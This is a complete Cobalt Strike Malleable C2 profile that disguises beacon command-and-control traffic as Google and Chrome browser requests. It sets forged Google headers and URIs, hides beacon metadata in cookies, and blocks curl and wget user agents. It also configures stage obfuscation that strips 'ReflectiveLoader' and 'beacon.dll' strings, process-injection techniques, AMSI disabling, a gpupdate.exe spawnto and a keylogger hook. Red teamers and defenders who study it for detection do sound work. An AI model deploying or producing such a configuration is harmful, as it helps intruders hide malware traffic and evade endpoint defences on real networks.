#chrome_browser profile
#xx0hcd

###Global Options###
set sample_name "chrome_browser.profile";

set sleeptime "38500";
set jitter    "27";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36";
set data_jitter "50";

set host_stage "false";

###DNS options###
dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH BANNER###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###SSL Options###
#https-certificate {
#    set keystore "domain001.store";
#    set password "password123";
#}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";
#
    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

###HTTP-GET Block###
http-get {

    set uri "/async/newtab_promos /async/newtab_ogb /async/ddljson";
    
    client {

        #header "Host" "www.google.com";
        header "Sec-Fetch-Site" "none";
        header "Sec-Fetch-Mode" "no-cors";
        header "Sec-Fetch-Dest" "empty";
        header "Accept-Language" "en-US,en;q=0.5";

	   
    metadata {
        base64;
	
	prepend "NID=";
	prepend "1P_JAR=2022; ";
        header "Cookie";

    }

    }

    server {
    
    	header "Version" "420932473";
        header "Content-Type" "application/json; charset=UTF-8";
        header "X-Content-Type-Options" "nosniff";
        header "Strict-Transport-Security" "max-age-31536000";
        header "Bfcache-Opt-In" "unload";
        header "Server" "gws";
        header "Cache-Control" "private";
        header "X-Xss-Protection" "0";
        header "X-Frame-Options" "SAMEORIGIN";
        
 
        output {

            base64url;
            
            prepend "
        
)
]
}'
{
  \"ddljson\":\"";
  	    
  	    append "\" 	    
  {
  }
}";


            print;
        }
    }
}



###HTTP-Post Block###
http-post {
    
    set uri "/service/update2/json /gen_204 ";
    #set verb "GET";
    set verb "POST";

    client {

	#header "Host" "www.google.com";
	header "Sec-Ch-Ua" "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"97\", \"Chromium\";v=\"97\"";
	header "Sec-Ch-Ua-Mobile" "?0";
	header "Sec-Ch-Ua-Platfrom" "Windows";
	header "Accept" "*/*";
        header "Origin" "https://www.google.com";
        header "Sec-Fetch-Site" "same-origin";
        header "Sec-Fetch-Mode" "no-cors";
        header "Sec-Fetch-Dest" "empty";
        header "Referer" "https://www.google.com";
        header "Accept-Language" "en-US,en;q=0.9";
        
        output {
            base64url;
            
            header "X-Client-Data";
            
	    
        }

        id {
	    base64url;
	    
	    #prepend "atyp";
            parameter "ei";

        }
    }

    server {
    
        header "Content-Type" "text/html; charset=UTF-8";
        header "Bfcache-Opt-In" "unload";
        header "Server" "gws";
        header "X-Xss-Protection" "0";
        header "X-Frame-Origins" "SAMEORIGIN";
        header "Alt-Svc" "h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000,h3-Q050=\":443\"; ma=2592000,h3-Q046=\":443\"; ma=2592000,h3-Q043=\":443\"; ma=2592000,quic=\":443\"; ma=2592000; v=\"46,43\"";

        output {
            netbios;	    
	   
	    prepend "\n";
	    prepend "{";
	    
	    append "\n";
	    append "}";

            print;
        }
    }
}



###HTTP-Stager Block###
http-stager {
	set uri_x86 "/async_newtab_pro";
	set uri_x64 "/async/Newtab_promos";
    
    client {

        header "Sec-Fetch-Site" "none";
        header "Sec-Fetch-Mode" "no-cors";
        header "Sec-Fetch-Dest" "empty";
        header "Accept-Language" "en-US,en;q=0.5";
    }
    
    server {
    
    	header "Version" "420932473";
        header "Content-Type" "application/json; charset=UTF-8";
        header "X-Content-Type-Options" "nosniff";
        header "Strict-Transport-Security" "max-age-31536000";
        header "Bfcache-Opt-In" "unload";
        header "Server" "gws";
        header "Cache-Control" "private";
        header "X-Xss-Protection" "0";
        header "X-Frame-Options" "SAMEORIGIN";
    
    	output {
    	
    		print;
    	}
    }
}


###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "12 Dec 2019 02:52:11";
    set entry_point     "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        strrep "This program cannot be run in DOS mode" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        strrep "This program cannot be run in DOS mode" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";

}
